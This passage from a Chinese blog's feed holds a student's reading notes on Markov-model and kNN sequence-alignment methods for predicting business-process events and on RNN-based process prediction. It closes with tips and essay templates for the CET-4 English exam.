</font>默认预测的提出没有仔细研究<br>当给定数据集很少时，导致无法机器学习和准确预测，所以为了解决这个问题，提出了几个为了解决特征和默认事件之间的非线性依赖关系的模型，通过补充特征默认值来补充数据，进行预测。<strong>默认预测</strong></p></blockquote><p>但是当数据多样化同时不聚集的时候，会导致高阶模型弱覆盖，对于未被覆盖的序列，就需要默认预测。但是默认预测会降低模型的准确度。<br><em>在马尔可夫模型中</em>，为了平衡覆盖与准确性，一般解决思想是合并多个不同阶的MMs的转换状态，然后在预测的时候遵循“冗余”状态。例如可选择马尔可夫模型（selective Markov model）</p><blockquote><p>TODO<br>遵循“冗余”状态的实际意义是什么？它的实际表现是什么<br>an extension of All Kth order Markov models (Deshpande &amp; Karypis, 2004)</p></blockquote><blockquote><p><font color="#2F4F4F">知识补充</font><br>个人理解<strong>弱覆盖</strong>是由于特征广而弱，无法高效学习，导致有一些特征被丢弃没有学习到。</p></blockquote><p>第二部部分讲述的是采用kNN算法来预测过程结果，即通过比对给定领域内的序列，找到最相似的序列。06年有研究者发表“预测使用电信公司的数据流失”，用欧几里德距离来计算给定序列与样本之间的距离。</p><blockquote><p>TODO 生物顺序结合没懂</p></blockquote><p>在本文中作者将KNN与生物学的序列对齐组合形成顺序kNN。</p><blockquote><p><font color="#bf242a">知识补充</font><br><strong>编辑距离</strong>是针对二个字符串（例如英文字）的差异程度的量化量测，量测方式是看至少需要多少次的处理才能将一个字符串变成另一个字符串。</p></blockquote><h3 id="creation"><a href="#creation" class="headerlink" title="creation"></a>creation</h3><blockquote><p>TODO 不理解下面的匹配机制</p></blockquote><p>首先是为了解决高阶MMs弱覆盖，提出了MMs和序列对准融合的技术。当预测模型无法找到预测实例对应的序列时，<strong>应用匹配过程</strong>以便从与给定序列中最相似的转换矩阵中提取那些序列（图案）。</p><p>其次是提出一种预测结果的序列kNN方法，即通过比对序列局部结果，然后比对相似程度，获得预测结果</p><h2 id="序列比对"><a href="#序列比对" class="headerlink" title="序列比对"></a>序列比对</h2><p><font color="#FF1493">为了确定序列相似性</font><br>序列比对主要类似于生物学中的新的DNA序列与DNA数据库进行比较。将DNA序列的事务与蛋白质数据库进行比较，以验证它们之间的关系是否可能发生在发生概率之间。</p><blockquote><p>序列比对<br>包括全局比对和局部比对<br>全局比对是提供了全局优化解决方案，遍历所有查询序列的整个长度。<br>局部比对旨在从两个查询序列中找到最相似的段</p></blockquote><p>我们在MMs中并不是使用当前的序列比对算法，而是使用序列比对的思想；同时作者提出<strong>局部序列比对与kNNs的结合</strong>使用方法：【替换矩阵】</p><blockquote><p><font color="#006400">知识补充</font><br>在序列比对算法中的<strong>替换矩阵</strong>又称为打分矩阵，其数学本质是统计权重。<br><a href="https://zhuanlan.zhihu.com/p/150582377">替换矩阵（计分矩阵）| 原理和作用 - 知乎</a><br>在序列比对中，我们一般需要给出一个定量的数值来描述两者的一致性和相似性。在此过程中，替换矩阵用来评价碱基或残基之间的相似性，在长期实践中，人们发现一些特定的碱基替换或者残基替换的频率是要高于另一些替换的，因此人们可以通过统计方法或者基于进化的突变模型来给每一种替换定义不同的分值，来体现出不同碱基或残基之间发生替换的可能性。其可以分成核酸序列替换矩阵和蛋白质序列替换矩阵。</p></blockquote><p> <strong><font color="#9932CC">替换矩阵：</font></strong><br> <em>生物学中用于描述单位时间内，一个氨基酸转换为另一个氨基酸的速率</em>。本文中替换矩阵作为单位矩阵，主对角线的元素是1，其他元素都是0。为了呈现突变，使用了更复杂形式的替代矩阵。上边<font color="#1E90FF">知识补充</font>中提到不同的矩阵不同值可以更好表现序列单元之间转换的可能性与频率。<font color="#FF00FF">我的理解是序列对比的权重表</font>。</p><p> <strong><font color="#9932CC">打分矩阵</font></strong><br> 即模型打分矩阵函数：</p><p> <img src="http://files.shanqianche.cn/2021710/1625901529848.png" alt="初始化"></p><p> <img src="http://files.shanqianche.cn/2021710/1625901755301.png" alt="计算公式"><br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>s</mi><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>j</mi></msub><mo>)</mo></math>是替换矩阵中Xi与Yj的替换分数。<br><font color="#483D8B">TODO</font> 公式中有个别参数读不懂</p><p><img src="http://files.shanqianche.cn/2021710/1625902300497.png" alt="栗子"></p><p><strong><font color="#FF8C00">案例：</font></strong><br>序列ABCDE与序列EBCAD对应的打分矩阵，根据分数高低来寻找最佳片段，然后沿着对角线从最高点到左上角，直至分数为0，来确定匹配序列，如图栗子中为BC。</p><h2 id="预测模型"><a href="#预测模型" class="headerlink" title="预测模型"></a>预测模型</h2><p><strong><font color="#9932CC">前提：</font></strong><br>本模型目的是在流程实例中预测<math xmlns="http://www.w3.org/1998/Math/MathML"><msubsup><mi>s</mi><mrow><mi>i</mi></mrow><mrow><mo>(</mo><mi>N</mi><mo>+</mo><mn>1</mn><mo>)</mo></mrow></msubsup></math>下一事件<math xmlns="http://www.w3.org/1998/Math/MathML"><msubsup><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mrow><mo>(</mo><mi>N</mi><mo>+</mo><mn>1</mn><mo>)</mo></mrow></msubsup></math>。其中<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>S</mi><mrow><mi>N</mi><mo>+</mo><mn>1</mn></mrow></msub></math>业务流程中的事件的预测是基于<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>S</mi><mo>=</mo><mo>{</mo><msub><mi>S</mi><mn>1</mn></msub><mo>,</mo><msub><mi>S</mi><mn>2</mn></msub><mo>&#x22EF;</mo><msub><mi>S</mi><mi>N</mi></msub><mo>}</mo></math></p><p>其中一个业务流程实例（Sj）是按时间顺序排列的离散事件(或任务)的组合Sj=<img src="http://files.shanqianche.cn/2021710/1625906179169.png" alt="enter description here">，而单个事件是来自于事件类型的有限集合<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>E</mi><mo>=</mo><mo>{</mo><msub><mi>e</mi><mn>1</mn></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>e</mi><mi>L</mi></msub><mo>}</mo></math></p><p><img src="http://files.shanqianche.cn/2021710/1625907751234.png" alt="predict model"></p><h3 id="MMs"><a href="#MMs" class="headerlink" title="MMs"></a>MMs</h3><p><a href="https://blog.zuishuailcq.xyz/2021/07/05/Markov%20Model%EF%BC%88%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E6%A8%A1%E5%9E%8B%EF%BC%89/">Markov Model（马尔可夫模型） | 吾辈之人，自当自强不息！</a></p><p>同时文中为了保障预测模型准确性，提出构建 <strong><font color="#006400">动态MMs</font></strong> ，通过存储单个事件在数据集中的次数、紧跟事件发生的下一个事件在数据集中的次数（事件A的下一个事件为B，这里指B的次数）和转换矩阵。还可以通过将折扣因子与事件数量结合，这样就可以在加入新数据时更新折扣因子来提供更多权重。</p><blockquote><p><strong><font color="#9400D3">知识补充</font></strong> 折扣因子<br><a href="https://www.zhihu.com/question/61389929">(95 封私信 / 79 条消息) 马尔可夫决策过程中为什么需要discount factor ，也就是问为啥时间近的状态影响越大？ - 知乎</a><br><a href="https://www.jianshu.com/p/678f57342d0b">#David Silver Reinforcement Learning # 笔记2-MDP - 简书</a><br><a href="https://www.cnblogs.com/wacc/p/5391209.html">强化学习笔记1 - Hiroki - 博客园</a></p></blockquote><h3 id="HMM"><a href="#HMM" class="headerlink" title="HMM"></a>HMM</h3><p><a href="https://blog.zuishuailcq.xyz/2021/07/05/Markov%20Model%EF%BC%88%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E6%A8%A1%E5%9E%8B%EF%BC%89/">Markov Model（马尔可夫模型） | 吾辈之人，自当自强不息！</a></p><h3 id="混合模型"><a href="#混合模型" class="headerlink" title="混合模型"></a>混合模型</h3><blockquote><p>主要是平衡准确性和覆盖</p></blockquote><p>结合高阶MMs与序列比对技术（Waterman 1994），以保持高阶马尔可夫模型的高精度，同时弥补缺乏覆盖面积【个人感觉是通过通过增加区别序列对比消除过拟合】，提出了MSA（Markov sequence alignment 马尔可夫序列比对）【一种基于相似序列可能产生相同结果的假设，<font color="#E9967A">指处理没有遇到过的新的序列，然后在转换矩阵中找最类似的</font>】</p><p>通过构建矩阵比较两个序列的重量，最小则最为接近。<br>规则：<br>节点事件相同，则重量为0<br>如果事件不同则为1或者 $δ$</p><p><img src="http://files.shanqianche.cn/2021713/1626182437859.png" alt="栗子"></p><ol><li>从两个序列中删除的第一事件A和E导致重量为1</li><li>两个序列中的第二个事件是B并且具有重量0</li><li>第四个事件A从EBCAD中删除，以便将两个D事件匹配在两个序列中的第四和第五位置，重量加 $δ$</li><li>最后，我们从ABCDE序列中删除最后一个事件E，增加重量 $δ$</li><li>匹配两个序列的总重量是 $w = 1 + 0 + 0 + δ + δ = 1 + 2δ$</li></ol><p><font color="#8B0000">以下示例将说明我们的方法</font>，通过一个三阶MMs的转换矩阵和序列BCC。此序列尚未发生在矩阵之前并未存储在矩阵中。<font color="#FF8C00">目的是从矩阵找到最相似的序列，并使用它们的预测来为给定序列BCC生成预测。</font></p><p><img src="http://files.shanqianche.cn/2021713/1626183826410.png" alt="替换矩阵"></p><ol><li>我们首先将BCC与ABC相匹配</li></ol><p><img src="http://files.shanqianche.cn/2021713/1626183855711.png" alt="BCC to ABC"></p><p>weight： $w=δ+0+δ=2δ$</p><ol start="2"><li>类似地，匹配CBC和BCC的得到的重量</li></ol><p>weight: $w=2δ$</p><ol start="3"><li>BAA和BCC</li></ol><p>weight: $w=2$</p><p>这一块理解的是当无法通过删除操作达到序列匹配的时候则加重为1，否则通过删除和插入惩罚达 $δ$ 到序列匹配，文中提到的是0.4。<br>通过比重，ABC与CBC一样小，所以<font color="#9400D3">ABC与CBC都和BCC最相似</font>，但是它们的预测载体分别是（0.1,0.2,0.7）和（0.1,0.5,0.4），基于这些向量，就是预测{B，C}的下一步。<br>这两个事件的发生的权重和频率是相等的;因此，由于两个序列中较高的转换概率分别是 $m _ { 13 }=0.7$ 和  $m _ { 22 }=0.5$ ，因此给定的序列预测的下一步是具有更高的转移概率C。</p><p><img src="http://files.shanqianche.cn/2021713/1626185939137.png" alt="算法一"></p><ol><li>比对序列，识别通过删除/插入符号匹配两个序列的最佳编辑过程</li></ol><p><img src="http://files.shanqianche.cn/2021713/1626185957405.png" alt="算法二"><br>2. 计算匹配两个序列的分数</p><p><font color="#D2691E">算法1和2说明了通过删除和插入惩罚来匹配两个序列的过程</font></p><h3 id="KNN结合序列比对"><a href="#KNN结合序列比对" class="headerlink" title="KNN结合序列比对"></a>KNN结合序列比对</h3><p>KNN基本上是一种非参数方法;因此，其中一个优点是不需要训练模型。序列KNN的核心思想是**<font color="#FF1493">找到类似的序列</font>** ，期望这些序列具有共同的行为和结果。<br>业务流程的比对需要加入时间特征，这里采用生物学的序列对准技术结合KNN，通过与序列对准组合，kNN允许我们顺序地比较符号序列，提出了K最近序列比对（KnsSA）。</p><p>首先根据给的N个序列，构建了距离矩阵 $( d _ { i j } ) N * N$ ，然后使用距离矩阵的元素对序列进行排序。通过使用局部对齐匹配每对序列来获得距离矩阵的元素</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><h3 id="过程分析和数据预处理"><a href="#过程分析和数据预处理" class="headerlink" title="过程分析和数据预处理"></a>过程分析和数据预处理</h3><pre><code>确定了MSA（Markov sequence alignment 马尔可夫序列比对）和KnsSA（KNN序列比对）</code></pre><blockquote><p><font color="#00CED1">非对应知识补充</font>：MSA<br><a href="https://blog.csdn.net/weixin_39569389/article/details/111647915">序列两两比对算法_多重序列比对(MSA)分析工具怎么选，看这一篇就够了_weixin_39569389的博客-CSDN博客</a><br><a href="https://www.jianshu.com/p/31fb919f1c91">【陪你学·生信】九、多序列比对-Multiple Sequence Alignment（MSA） - 简书</a></p></blockquote><blockquote><p><font color="#B8860B">非对应知识补充</font>：MSA<br><a href="https://zhuanlan.zhihu.com/p/92254686">替代梯度下降——基于极大值原理的深度学习训练算法 - 知乎</a><br>MSA可以替代梯度下降函数<br>优一：MSA的每次迭代的收敛速度确实比梯度下降方法快一些<br>优二：梯度下降法的一大问题就是如果参数初始化得不好，那么就有可能会遇到一些局部平坦的区域，导致收敛速度变慢，而MSA方法则不会受到这个问题的影响<br>缺点：每轮迭代的时间会比梯度下降慢得多，这是可以理解的，毕竟MSA的每轮迭代都需要去找到一个最大值，而梯度下降只需要计算一次梯度就行了。这就导致了<strong>虽然MSA每次迭代收敛地更快，但是从时间上来看却反而更慢了</strong><br><img src="http://files.shanqianche.cn/2021714/1626226968387.png" alt="总结"></p></blockquote><p>第一个数据集（DS1）由电信线路故障修复记录为9个月。第二（DS2）涵盖1个月的时间，并表示固定宽带断层的过程。第三数据集DS3来自不同的故障修复过程。数据集DS1和DS2用于我们扩展马尔可夫模型的实验中。数据集DS3和DS4用于KNSSA实验。</p><p>数据复杂且长短不一。【文中没有提到整理数据方式，只是进行可视化】</p><p><img src="http://files.shanqianche.cn/2021713/1626187757351.png" alt="通过工具Aperture挖掘10%的DS1的数据形成的可视化"></p><h3 id="扩展马尔可夫模型实验"><a href="#扩展马尔可夫模型实验" class="headerlink" title="扩展马尔可夫模型实验"></a>扩展马尔可夫模型实验</h3><blockquote><p>扩展马尔可夫模型实验</p></blockquote><ol><li>RM - 随机模型</li></ol><p>为了找到当前之后的下一个任务，我们随机从潜在的下一个任务中选择。例如，从历史数据得知事件a来自于序列A属于集合{C，D，E}的任务，我们随机选择从该设置的值作为预测的下一步。【不通，反正就是一个baseline，在有限的范围内进行下一步】</p><ol start="2"><li>高阶MMs</li></ol><p>从一阶到kth阶生成许多不同的秩马尔可夫模型。给定序列，我们从最高阶MMs开始。如果在转换矩阵中找不到给定序列，我们通过删除序列中的第一个事件来创建新的较短序列。然后，我们将使用下一个下阶MMs继续过程，直到我们在转换矩阵中找到一个匹配项，或者在尝试第一阶Markov模型之后，需要默认预测。【只通过降阶来预测 <strong><font color="#FF8C00">所有</font></strong> 序列】</p><ol start="3"><li>HMM</li></ol><p>我们测试了几个具有不同长度的多个序列HMM，用于输入序列和不同数量的隐藏状态，并选择了最佳状态。</p><p>**<font color="#9932CC">结果分析对比</font>**：<br>90%用于训练，10%做预测。使用十折交叉验证预测结果</p><blockquote><p><font color="#006400">知识补充</font>交叉验证<br><a href="https://zhuanlan.zhihu.com/p/267910629">8. Sklearn — 交叉验证(Cross-Validation) - 知乎</a></p></blockquote><p>首先是构建一阶到七阶MSAs，然后通过通过MSAs选取数据集的最适合 $l$ ,其中DS1取值为5，DS2取值3。</p><blockquote><p>$l$ 表示序列选取长度</p></blockquote><p>下图一，二别说明了DS1和DS2这两个数据集的MSAa准确性。结果表明，通过引入<font color="#FF00FF">默认预测</font>改进模块，MSA优于其他可比模型，尤其是当马尔可夫模型的阶数增加时。这是因为 <strong><font color="#D2691E">序列之间比较的相关性与其长度成正比。</font></strong></p><blockquote><p>数字表示阶层<br>蓝色表示原生MMs的预测准确度，红加蓝表示加上默认预测模块改进后的预测精确度。</p></blockquote><p><img src="http://files.shanqianche.cn/2021714/1626252630431.png" alt="图一，使用数据集DS1在MMs中应用默认预测模块前后的正确预测百分比"></p><p><img src="http://files.shanqianche.cn/2021714/1626253369803.png" alt="图二，使用数据集DS2在MMs中应用默认预测模块前后的正确预测百分比"></p><p><font color="#9932CC">分析：</font><br>二阶MSAs在一系列不同阶MSAs中表现最好，就DS1而言，正确预测27%；三阶MSAs在DS2中表现最好，可以达到70%的准确率。同时可以分析得到在五阶MSAs预测时，默认预测模块的作用明显增加。</p><p><img src="http://files.shanqianche.cn/2021715/1626314785957.png" alt="四种模型预测比较，第一个为全阶MMs"></p><p>这里选择的是五阶段MSA和全五阶MMs，因为全阶段MMs在高阶时是具有优势的，这里为了验证默认预测的作用所以使用五阶。该图显示了两个数据集下所有模型的性能。可以看出，RM表现最差，DS2的成功率只有10%左右。当应用于更大的数据集DS1时，结果下降到接近2%（MSAs是其14倍）。同时可以发现选择正确的下一个任务的概率随着集合大小的增加而降低。结果突出了处理复杂数据集的难度。当数据不是太多样化(即DS2)时，MSA(五阶)获得最高数量的正确预测，结果为63%。与其他基准相比，MSA结果优于达到57%的五阶马尔可夫模型、达到60%的全Kth (K=5)马尔可夫模型和达到43%的隐马尔可夫模型。</p><h3 id="连续KNN实验"><a href="#连续KNN实验" class="headerlink" title="连续KNN实验"></a>连续KNN实验</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>这块作者提出的预测流程结果，所以需要给数据做标记，用于区分输出结果是成功还是失败。但是不同数据集输出的结果判断标注不同，<font color="#FF8C00">同一个数据集中不同流程的结果判断标注也不同</font>，这就无法统一对预测结果进行判定。</p><p><font color="#9932CC">为了寻找到不同业务流程相统一的结果判断标准，这里采用的是通过设置时间阈值来衡量流程结果的成功与否。</font></p><pre><code>然而，在DS4的情况下，实际交付日期和向客户承诺的交付日期之间的差被用作确定成功和失败的标准。特别是，如果实际交付日期在约定日期之前，则该流程实例被归类为成功，否则被归类为失败。</code></pre><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><blockquote><p><font color="#7FFF00">通过另外两种baseline来评估KnsSA</font></p></blockquote><ol><li>RM – random model(随机模型)：为了找到过程的结果，我们随机生成一个介于0和1之间的数字；如果生成的数字大于0.5，则结果为成功(1)，反之亦然；如果生成的数字小于0.5，则结果为失败(0)</li><li>Original KNN： 我们选择K个最近的序列是因为它们有共同的独特任务。例如，给定两个序列A、B、D和A、A、C，第一个序列中有一个A、一个B和一个D；第二个中有两个As和一个C。每个独特的任务可以被视为一个类别。每个类别的距离计算为相应任务出现次数的差值。为了获得任意两个给定序列之间的总距离，对所有类别进行求和。例如，前面给出的两个序列由四个类别A、B、C和D组成。类别A的距离分别为dA= 1，类别B、C和D的距离分别为dB=1、dC=1和dD= 1。这两个序列的总距离为d=dA+dB+dC+dD=4【每个流程中每个事件进行求总距离】</li></ol><p>该模型是局部序列比对技术与KNN的结合模型，所以选择KNN的k值，结合实验中标签是0和1，这里作者k值选择为<font color="#FF8C00">奇</font>数；同时考虑数据集的多样性，k值应该<font color="#FF8C00">较小</font>。</p><blockquote><p>**<font color="#B8860B">知识补充</font>**： k值为什么选择奇数<br><img src="http://files.shanqianche.cn/2021715/1626333046633.png" alt="k值为什么选择奇数"></p></blockquote><p><img src="http://files.shanqianche.cn/2021715/1626333229424.png" alt="Local KnsSA模型对DS3，DS4预测结果"></p><p><img src="http://files.shanqianche.cn/2021715/1626333425840.png" alt="Local KnsSA，KNN，RM对于数据集预测结果"></p><p><strong>结果表明</strong>，该模型优于原始KNN和随机猜测的基准模型。这也意味着数据的时间特性对于预测过程结果很重要。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>本文的设计构思，首先通过MMs和HMM生成数据集的替换矩阵，然后作者提出一种序列比对的马尔可夫扩展模型（MSAs）。为了验证该模型的有效性，与MMs和HMMs进行对比，发现其准确率由于其它至少10%。<br>同时表明了高阶马尔可夫模型预测准确率高于一阶【图五】。从五阶以后加入缺省默认预测模块后可以大幅度提高预测准确度。<br>第二个贡献是提出新的序列比对KNN（KnsSA）。该方法优于基准模型，证明了数据的序列特征在预测过程结果中的重要作用。相将相似序列进行分类，然后进行下一步处理。</p><h2 id="下一步构思"><a href="#下一步构思" class="headerlink" title="下一步构思"></a>下一步构思</h2><p>未来的研究将着眼于使用序列比对和K均值聚类将数据聚类成K个组，然后用合适的方法处理每个组</p>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> RPA </tag>
            
            <tag> deep learning </tag>
            
            <tag> paper </tag>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习与循环神经网络在预测下一个过程事件问题上的初步应用</title>
      <link href="/2021/06/25/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%BE%AA%E7%8E%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9C%A8%E9%A2%84%E6%B5%8B%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%BF%87%E7%A8%8B%E4%BA%8B%E4%BB%B6%E9%97%AE%E9%A2%98%E4%B8%8A%E7%9A%84%E5%88%9D%E6%AD%A5%E5%BA%94%E7%94%A8/"/>
      <url>/2021/06/25/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%BE%AA%E7%8E%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9C%A8%E9%A2%84%E6%B5%8B%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%BF%87%E7%A8%8B%E4%BA%8B%E4%BB%B6%E9%97%AE%E9%A2%98%E4%B8%8A%E7%9A%84%E5%88%9D%E6%AD%A5%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><font color="#DC143C">TITLE</font>: A Deep Learning Approach for Predicting Process Behaviour at Runtime</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>描述深度学习与循环神经网络在预测下一个过程事件问题上的初步应用</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>主要介绍了流程预测与自然语言的处理有很多地方类似，同时也有不同之处。</p><p><font color="#FF1493">流程预测与自然语言不同：</font></p><ul><li>过程预测（事件类型数量）中词汇量的大小远小于自然语言词汇的大小</li><li>轨迹的长度远远超过自然语言中的典型句子长度</li><li>通过内部过程逻辑确定或约束过程事件序列，通常通过基于案例数据确定的决策规则确定。然而，以语法和形态规则的形式，自然语言也受到限制</li></ul><h2 id="Related-Work"><a href="#Related-Work" class="headerlink" title="Related Work"></a>Related Work</h2><p><strong><font color="#B22222">这块主要讲了一下业务流程预测相关的研究</font></strong></p><h3 id="预测完成一个案件的剩余时间"><a href="#预测完成一个案件的剩余时间" class="headerlink" title="预测完成一个案件的剩余时间"></a>预测完成一个案件的剩余时间</h3><ol><li>使用事件频率、事件时间和案例数据的增强回归</li></ol><p><img src="http://files.shanqianche.cn/2021626/1624673781121.png" alt="When will this case finally be finished?"><br>2. 将隐马尔可夫模型应用于事件序列和执行时间[基于一个带注释的转换系统]</p><p><img src="http://files.shanqianche.cn/2021626/1624674466379.png" alt="A test-bed for the evaluation of bussiness process prediction techniques"><br>3. 使用聚类树和有限状态机(FSM)来预测运行过程案例的剩余时间</p><p><img src="http://files.shanqianche.cn/2021626/1624674870904.png" alt="Context-aware predictions on bussiness processes: An ensemble-based solution"></p><p><img src="http://files.shanqianche.cn/2021626/1624674967541.png" alt="Discovering context-aware models for predicting business process performances"><br>4. 将复杂的事件处理（CEP）应用于事件序列，并培训以预测其未来行为</p><p><img src="http://files.shanqianche.cn/2021626/1624675079138.png" alt="Facilitating predictive event-driven process analytics"><br>5. 使用随机petri网模拟</p><p><img src="http://files.shanqianche.cn/2021626/1624675153578.png" alt="Prediction of remaining service execution time using stochastic petri nets with arbitrary firing delays"></p><p><img src="http://files.shanqianche.cn/2021626/1624675288618.png" alt="Prediction of bussiness process durations using non-markovian stochastic petri nets"><br>6. 基于案例数据聚类和回归的预测技术</p><p><img src="http://files.shanqianche.cn/2021626/1624675498447.png" alt="A data-driven prediction framework for analyzing and monitoring business process performances"><br>7. 对部分和全部案例采用聚类方法</p><p><img src="http://files.shanqianche.cn/2021626/1624675713998.png" alt="Process remaining time prediction using query catalogs"><br>8. 提出了两种基于带注释的转换系统的方法，以及支持向量回归和朴素贝叶斯分类器</p><p><img src="http://files.shanqianche.cn/2021626/1624675768877.png" alt="Data-aware remaining time prediction of business process instances"></p><p><img src="http://files.shanqianche.cn/2021626/1624675838918.png" alt="Time and activity sequence prediction of business process instances"></p><h3 id="流程预测结果评估【二元评估】"><a href="#流程预测结果评估【二元评估】" class="headerlink" title="流程预测结果评估【二元评估】"></a>流程预测结果评估【二元评估】</h3><ol><li>在时间、资源和案例数据上使用决策树</li></ol><p><img src="http://files.shanqianche.cn/2021626/1624676985594.png" alt="Predictive business operations management"></p><p><img src="http://files.shanqianche.cn/2021626/1624677076066.png" alt="Business process intelligence"></p><p><img src="http://files.shanqianche.cn/2021626/1624677129344.png" alt="Improving bussiness "><br>2. 使用支持向量机</p><p><img src="http://files.shanqianche.cn/2021626/1624686889124.png" alt="Periodic berformance prediction for real-time business process monitoring"><br>3. 基于聚类和局部离群点检测</p><p><img src="http://files.shanqianche.cn/2021626/1624687171172.png" alt="Real-time business process monitoring method for prediction of abnormal termination using knni-based LOF prediction"><br>4. 使用决策树来预测违反线性时序逻辑限制</p><p><img src="http://files.shanqianche.cn/2021626/1624687372135.png" alt="Predictive monitoring of business processes"><br><img src="http://files.shanqianche.cn/2021626/1624687442053.png" alt="Predictive monitoring of business processes"><br>5. 使用随机森林</p><p><img src="http://files.shanqianche.cn/2021626/1624687491226.png" alt="Complex symbolic sequence encodings for predictive monitoring of business processes"><br>6. 采用神经网络、约束满足和服务质量聚合</p><p><img src="http://files.shanqianche.cn/2021626/1624687569443.png" alt="Comparing and combining predictive business process monitoring techniques"><br>7. 聚类和回归</p><p><img src="http://files.shanqianche.cn/2021626/1624687617567.png" alt="A prediction framework for proactive monitoring aggregate process-performance indicators"></p><h2 id="Deep-Learning"><a href="#Deep-Learning" class="headerlink" title="Deep Learning"></a>Deep Learning</h2><h2 id="Process-Prediction-using-RNN"><a href="#Process-Prediction-using-RNN" class="headerlink" title="Process Prediction using RNN"></a>Process Prediction using RNN</h2><h2 id="Experimental-Results"><a href="#Experimental-Results" class="headerlink" title="Experimental Results"></a>Experimental Results</h2><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h2 id="扩展学习"><a href="#扩展学习" class="headerlink" title="扩展学习"></a>扩展学习</h2><h3 id="阅读paper36【P10】"><a href="#阅读paper36【P10】" class="headerlink" title="阅读paper36【P10】"></a>阅读paper36【P10】</h3><p><img src="http://files.shanqianche.cn/2021627/1624759564094.png" alt="paper36"></p><h3 id="递归神经网络与循环神经网络"><a href="#递归神经网络与循环神经网络" class="headerlink" title="递归神经网络与循环神经网络"></a>递归神经网络与循环神经网络</h3><p><font color="#0000FF">Recursive Neural Network || Recurrent Neural Network</font></p><h3 id="Hidden-Markov-Models-HHM"><a href="#Hidden-Markov-Models-HHM" class="headerlink" title="Hidden Markov Models(HHM)"></a>Hidden Markov Models(HHM)</h3><h3 id="LSTM与RNN"><a href="#LSTM与RNN" class="headerlink" title="LSTM与RNN"></a>LSTM与RNN</h3>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> deep learning </tag>
            
            <tag> paper </tag>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>555~四级</title>
      <link href="/2021/06/01/555~%E5%9B%9B%E7%BA%A7/"/>
      <url>/2021/06/01/555~%E5%9B%9B%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h2><p><img src="http://files.shanqianche.cn/202161/1622551964785.png" alt="作文要求"></p><ol><li>时间很紧，第一遍就需要写在纸上</li><li>手写，需要注意字体，建议衡水体</li><li>写的时候右侧也对齐，同时写85%，这样美观</li><li>背一些句型和一些常用词汇的替换词</li><li>切记不要跑题，介意通过直接更改题干来立题</li></ol><p><img src="http://files.shanqianche.cn/202161/1622552071072.png" alt="衡水体"></p><h3 id="衔接词"><a href="#衔接词" class="headerlink" title="衔接词"></a>衔接词</h3><p>due to 因为<br>in spite of尽管，<br>thus因此，<br>on the contrary相反地<br>首先 in the first place, to begin with, first of all, for one thing<br>然后，而且 in addition, what’s more,moreover, besides, for another thing<br>最后 last but not the least<br>表举例 for instance<br>表对比 in contrast, on the contrary</p><h3 id="专业词汇"><a href="#专业词汇" class="headerlink" title="专业词汇"></a>专业词汇</h3><p><a href="https://www.bilibili.com/video/BV1MN411Z7Lu?spm_id_from=333.788.b_765f64657363.3">热点词</a></p><h3 id="例句"><a href="#例句" class="headerlink" title="例句"></a>例句</h3><ol><li>It is obvious that the cartoon is trying to tell us…</li><li>Currently, there is a growing tendency that people in mounting numbers are showing great enthusiasm for sth.</li><li>From my perspective/As for me, at no time should we ignore the importance of A.</li><li>“<strong><strong><strong>” is the opinion held by</strong></strong></strong> . This remark has been confirmed time and again by more and more people. “______”是______的观点，而且被越来越多的人反复证实。</li><li>The advantages of A are much greater than those of B.</li><li>A number of factors are accountable for this situation. 造成这种情况的因素有很多。</li></ol><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><ol><li><p>我的模板</p><p> WIth the proliferation of <del>(随着), xxx has triggered a heated discussion. As far as I am concern, I am in  line with view that</del>(观点)。<br> First and foremost, as is know to all, the primary reason is that <del>. There is every reason to emphasize the importance in ~. Never can we ignore the indispensability of ~.<br> 首先，众所周知，主要原因是</del>。 有充分的理由强调〜的重要性。 我们永远不能忽视 ~ 的不可或缺性。<br> Furthermore, the second noteworthy reason is that  <del>. Therefore, it is not exaggerated to say that ~.<br> 此外，第二个值得注意的原因是 ~. 所以说</del>一点都不为过。<br> Last and not least, there is no denying that <del>.So, it reasonable to reach the ~<br> 最后也是最重要的一点，不可否认</del>。所以，达到<del>是合理的<br> In summary, taking into account all the factors above. I reiterate my standpoint that ~<br> 综上所述，考虑到以上所有因素。 我重申我的立场</del></p></li><li><p>积极的</p></li></ol><p><img src="https://files.shanqianche.cn/202212/1670052601643.png" alt="积极的品质"></p><ol 